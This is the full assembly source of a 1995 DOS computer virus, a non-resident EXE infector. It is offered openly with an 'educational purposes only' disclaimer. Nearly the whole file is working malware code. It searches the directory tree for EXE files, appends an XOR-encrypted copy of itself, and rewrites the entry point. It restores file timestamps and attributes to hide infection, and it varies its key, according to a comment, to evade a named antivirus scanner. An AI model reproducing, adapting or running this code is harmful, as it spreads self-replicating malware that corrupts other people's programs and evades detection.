;
;	VIRUS02.ASM
;
;	Author: Johan Gardhage <johan.gardhage@gmail.com>
;	Originally written in 1995.
;
; Description:
; This virus is a non-resident infector of EXE files, encrypted with an
; XOR algorithm.
;
; The virus will search the whole tree for files to infect, therefore
; becomes very slow.
;
; Disclaimer:
; I take no responsibility for any damage, either direct or implied,
; caused by the usage of this virus source code or of the resulting code
; after assembly. The code was written for educational purposes ONLY.
;

	locals @@

cseg	segment byte public 'code'
	assume cs:cseg, ds:cseg

	org 100h

VirusSize	equ	EndVirus-BeginVirus
VirusIdentifier	equ	'Ri'

BeginVirus:
	jmp	EntryPoint

;---------------------------------------------------------------------
;	Start of encrypted section
;---------------------------------------------------------------------

BeginEncryptedSection:
	cld						; clear direction flag

	mov	ah,1ah					; set new dta area
	lea	dx,[bp+DtaArea]
	int	21h

	mov	bx,es
	push	cs					; es points to code segment
	pop	es

	lea	si,[bp+ExeRegs+4]			; prepares the return code
	lea	di,[bp+ExeRegs]
	movsw						; transfer buffer contents
	lodsw
	add	ax,bx					; bx holds start es = psp
	add	ax,10h
	stosw

	lea	di,[bp+ExeRegs+12]
	lea	si,[bp+ExeRegs+8]
	lodsw						; prepares the restore of ss/sp
	add	ax,bx
	add	ax,10h
	stosw
	movsw

	mov	ah,47h					; save starting directory
	xor	dl,dl
	lea	si,[bp+SaveDir]
	int	21h

FindNewFiles:						; start finding files
	mov	ah,4eh
	mov	cx,7
	lea	dx,[bp+Pattern]

FindFiles:
	int	21h

	jnc	OpenFile				; if found a file
	lea	dx,[bp+DirMask]				; else change directory
	mov	ah,3bh
	int	21h
	jnc	FindNewFiles
	jmp	NoMoreFiles				; end of all files

OpenFile:
	mov	ax,3d02h				; open the found file
	lea	dx,[bp+DtaArea+1eh]
	int	21h

	xchg	ax,bx					; file handle in bx

	mov	ah,3fh					; read the exe header
	mov	cx,18h
	lea	dx,[bp+ExeHead]
	int	21h

	lea	si,[bp+ExeHead]				; check if it's an executable
	lodsw
	cmp	ax,'ZM'
	je	CheckIfInfected
	cmp	ax,'MZ'
	je	CheckIfInfected
	jmp	CloseFile				; else jump

CheckIfInfected:
	add	si,10h					; saving another byte
	; lea	si,[bp+ExeHead+12h]
	lodsw
	cmp	ax,VirusIdentifier			; is it already infected?
	jne	InfectFile
	jmp	CloseFile

InfectFile:
	lea	di,[bp+ExeRegs+4]			; save the files ip/cs
	movsw
	movsw

	lea	si,[bp+ExeHead+0eh]			; save the files ss/sp
	movsw
	movsw

	lea	di,[bp+ExeHead+12h]			; mark the file infected
	mov	ax,VirusIdentifier
	stosw

	mov	al,2					; go to end_of_file
	call	SetFilePointer				; dx/ax is file length

	mov	cx,10h					; use div to save bytes
	div	cx
	sub	ax,word ptr ds:[bp+ExeHead+8]
	xchg	dx,ax
	stosw						; put new ip/cs in ExeHead
	xchg	dx,ax
	stosw

	inc	ax					; put new ss/sp in ExeHead
	inc	ax
	mov	word ptr [bp+ExeHead+0eh],ax
	mov	word ptr [bp+ExeHead+10h],4b0h

	mov	ah,2ch					; get random number
	int	21h
	xor	dh,dh					; just alter the code a little bit
	or	dl,00001010b				; with encryption so TB-scan wont't
	mov	word ptr [bp+Key],dx			; find garbage instruction

	mov	ax,08d00h				; copy entire virus to 8d00h:100h
	mov	es,ax
	mov	di,100h
	lea	si,[bp+BeginVirus]
	mov	cx,(VirusSize+1)/2
	rep	movsw
	push	es
	pop	ds
	push	bp
	xor	bp,bp					; and encrypt it there
	call	EncryptDecrypt

	mov	ah,40h					; write virus to file from position
	mov	cx,VirusSize				; 08d00h:100h
	lea	dx,[bp+BeginVirus]
	int	21h
	pop	bp

	push	cs
	pop	ds

	mov	al,2					; go to end of file
	call	SetFilePointer

	mov	cx,512					; get filesize in 512 modules
	div	cx
	inc	ax
	mov	word ptr [bp+ExeHead+2],dx		; put modulo/filesize in
	mov	word ptr [bp+ExeHead+4],ax		; exe header

	xor	al,al					; go to beginning of file
	call	SetFilePointer

	mov	ah,40h					; write new exe header
	mov	cx,18h
	lea	dx,[bp+ExeHead]
	int	21h

	lea	si,[bp+DtaArea+16h]			; restore time/date stamp
	mov	cx,word ptr [si]
	mov	dx,word ptr [si+2]
	mov	ax,5701h
	int	21h

CloseFile:
	mov	ah,3eh					; close file
	int	21h

	mov	ax,4301h				; restore file attribute
	mov	cl,byte ptr [bp+DtaArea+15h]
	lea	dx,[bp+DtaArea+1eh]
	int	21h

	mov	ah,4fh					; find next file
	jmp	FindFiles

NoMoreFiles:
	lea	dx,[bp+SaveDir]				; restore starting directory
	mov	ah,3bh
	int	21h

	pop	es					; restore old es/ds
	pop	ds

	cli						; put back original ss/sp
	mov	ss,word ptr cs:[bp+ExeRegs+12]
	mov	sp,word ptr cs:[bp+ExeRegs+14]
	sti						; interrupts allowed again

	db	0eah					; jmp to original ip
ExeRegs	dw	0,0,0,0fff0h,0,0,0,0
DirMask	db	'..',0
Pattern	db	'*.exe',0

SetFilePointer:
	mov	ah,42h					; Jump in file
	xor	cx,cx					; this saves a few bytes as
	cwd						; it's used a few times
	int	21h
	ret

EndEncryptedSection:

;---------------------------------------------------------------------
;	End of encrypted section
;---------------------------------------------------------------------

	db	0					; pad out a byte so encryption
							; value won't be overwritten
Key	dw	0

EncryptDecrypt:
	mov	si,word ptr ds:[bp+Key]
	lea	di,[bp+BeginEncryptedSection]
	mov	cx,(EndEncryptedSection-BeginEncryptedSection+1)/2
@@loop:	xor	word ptr ds:[di],si
	inc	di
	inc	di
	loop	@@loop
	ret

EntryPoint:
	push	ax
	pop	ax
	push	ax
	pop	ax
	call	@@delta
@@delta:pop	bp
	sub	bp,offset @@delta

	push	ds					; save es & ds
	push	es
	push	cs					; and point ds to code segment
	pop	ds

	call	EncryptDecrypt				; decrypt contents of file
	jmp	BeginEncryptedSection

EndVirus:

ExeHead	db	18h dup(?)
DtaArea	db	43 dup(?)
SaveDir	db	64 dup(?)

cseg ends

end BeginVirus
